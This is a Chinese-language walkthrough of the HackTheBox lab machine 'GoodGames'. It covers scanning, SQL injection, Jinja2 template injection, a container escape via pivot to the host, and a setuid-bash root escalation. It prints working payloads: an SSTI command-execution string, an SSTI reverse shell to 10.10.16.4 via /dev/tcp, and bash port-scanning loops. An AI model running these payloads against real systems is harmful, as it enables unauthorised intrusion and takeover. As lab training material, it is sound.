端口扫描

nmap -sC -sV 10.10.11.130 -o good

echo "10.10.11.130 goodgames.htb" >> /etc/hosts

目录扫描

dirsearch -u http://goodgames.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

SQL盲注

访问signup页面，注册了一个账号，但是进去也没什么用

就来抓包看一下这个登陆页面

使用sqlmap一把梭，发现一个mysql延迟注入

接下来的都是基操，我就不演示了。

admin@goodgames.htb
superadministrator

查看源代码，发现子域名：internal-administration.goodgames.htb

echo "10.10.11.130 internal-administration.goodgames.htb" >> /etc/hosts

这个页面也是python语言写的，尝试admin' or 1=1-- -;万能密码登陆失败，然后就尝试用前面那个密码尝试登陆

admin:superadministrator

SSTI模板注入漏洞

SSTI模板注入，我在Full Name这里写入{{7*7}}，成功返回结果

查看当前用户权限，发现直接是一个root权限的
{{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('id').read() }}

容器内信息收集

先来反弹一个shell
{{ self._TemplateReference__context.joiner.init.globals.os.popen('/bin/bash -c "bash -i >& /dev/tcp/10.10.16.4/1234 0>&1"').read() }}

这里尝试挂载宿主机进行逃逸，但是挂载的时候提示拒绝访问；既然这里执行命令时候的权限有限制，我猜测应该存在capabilities，果然，如我所料，查看是否是特权容器，靠，激动了。。。

然后将工具上传

容器提权工具：https://github.com/cdk-team/CDK

./cdk evaluate --full

检测到可能存在如下漏洞，CVE-2021-22555漏洞是kubernets pod容器存在逃逸，与这里应用环境不符，其他都是本地提权，在这里没什么用。

但是这些好像都没什么用，扫描一下C段吧

好家伙，算你狠，这里居然还有一个172.19.0.1

for i in {1..254};do (ping -c 2 172.19.0.${i} | grep "ttl=");done;

探测一下172.19.0.1的端口，存在22端口，尝试利用上面的密码登陆一下。

for port in {1..65535}; do echo > /dev/tcp/172.19.0.1/${port} && echo "${port} open";done 2>/dev/null

这里连接的时候遇到了一点插曲，ssh连接提示无法分配伪终端，解决办法：script /dev/null -c bash，升级一下shell就好了。

权限提升

登陆上来之后查看IP，发现是宿主机。

仔细看容器和宿主机中/home/augustus目录下文件，基本上时间都是一样的

我在容器的/home/augustus目录下创建了一个test文件

发现宿主机的/home/augustus目录下也会生成一个test文件，并且是root权限。

注意：这里要从宿主机复制bash到augustus用户目录下，要是从docker复制的话会报错。

chown root:root bash
chmod 4777 bash

成功获取到root权限。

./bash -p
